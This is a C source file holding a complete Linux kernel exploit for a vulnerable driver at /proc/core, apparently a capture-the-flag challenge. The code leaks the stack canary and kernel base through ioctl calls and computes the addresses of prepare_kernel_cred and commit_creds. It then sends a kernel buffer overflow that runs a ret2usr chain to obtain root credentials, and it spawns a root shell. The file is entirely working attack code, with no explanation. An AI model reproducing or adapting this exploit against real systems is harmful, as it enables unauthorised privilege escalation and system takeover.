#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <stdint.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include <sys/types.h>
#include <fcntl.h>

int g_fd;

size_t g_canary;

// kernel .text base
size_t g_img_base;

// 0xffffffff81000b2f : pop rdi ; ret
size_t pop_rdi_ret;

// swapgs_restore_regs_and_return_usermod + 22
size_t kpti_tramponine;

size_t prepare_kernel_cred;
size_t commit_creds;

size_t user_ss, user_sp, user_rflags, user_cs;
void save_state() {
    __asm__(
        ".intel_syntax noprefix;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "mov user_cs, cs;"
        "pushf;"
        "pop user_rflags;"
        ".att_syntax;"
    );
    puts("[*] State Saved!");
}

void get_shell() {
    if (getuid() == 0) {
        puts("[*] Success!! Enjoy!!");
        system("/bin/sh");
    } else {
        puts("Privileg Escalation failed.");
        exit(-1);
    }
}

size_t user_rip = (size_t)get_shell;
void escalate_priv(void) {
    __asm__(
        ".intel_syntax noprefix;"
        "xor rdi, rdi;"
        "mov rax, prepare_kernel_cred;"
        "call rax;"
        "mov rdi, rax;"
        "mov rax, commit_creds;"
        "call rax;"
        "swapgs;"
        "push user_ss;"
        "push user_sp;"
        "push user_rflags;"
        "push user_cs;"
        "push user_rip;"
        "iretq;"
        ".att_syntax;"
    );
    // void*(*pkc)(size_t) = prepare_kernel_cred;
    // void*(*mc)(void*) = commit_creds;
    // mc(pkc(0));
}

void leak() {
    size_t buf[10] = {0};

    // set off
    ioctl(g_fd, 0x6677889C, 0x40);
    ioctl(g_fd, 0x6677889B, buf);
    
    g_canary = buf[0];
    printf("[*] Canary=%#lx\n", g_canary);

    // buf[4] == proc_reg_unlocked_ioctl+49
    g_img_base = buf[4] - 0x1dd6a0 - 49;
    printf("[*] Kernel .text@%#lx\n", g_img_base);

    pop_rdi_ret = g_img_base + 0xb2f;
    kpti_tramponine = g_img_base + 0xa008da + 22;
    prepare_kernel_cred = g_img_base + 0x9cce0;
    commit_creds = g_img_base + 0x9c8e0;

    printf("[*] prepare_kernle_cred@%#lx\n", prepare_kernel_cred);
    printf("[*] commit_creds@%#lx\n", commit_creds);
}

void overflow() {
    size_t buf[0x30] = {0};
    size_t off = 8;

    buf[off++] = g_canary;
    buf[off++] = 0; // rbx
    buf[off++] = (size_t)escalate_priv;
    // buf[off++] = kpti_tramponine;
    // buf[off++] = 0;
    // buf[off++] = 0;
    // buf[off++] = (size_t)get_shell;
    // buf[off++] = user_cs;
    // buf[off++] = user_rflags;
    // buf[off++] = user_sp;
    // buf[off++] = user_ss;

    write(g_fd, buf, sizeof(buf));
    printf("[*] %s: Payload Prepared.\n", __func__);
    ioctl(g_fd, 0x6677889A, 0xffffffffffff0100);
}

int main() {
    g_fd = open("/proc/core", O_RDWR);
    if (g_fd < 0) {
        perror("open /proc/core failed.");
        exit(-1);
    }

    save_state();
    leak();
    overflow();
    return 0;
}

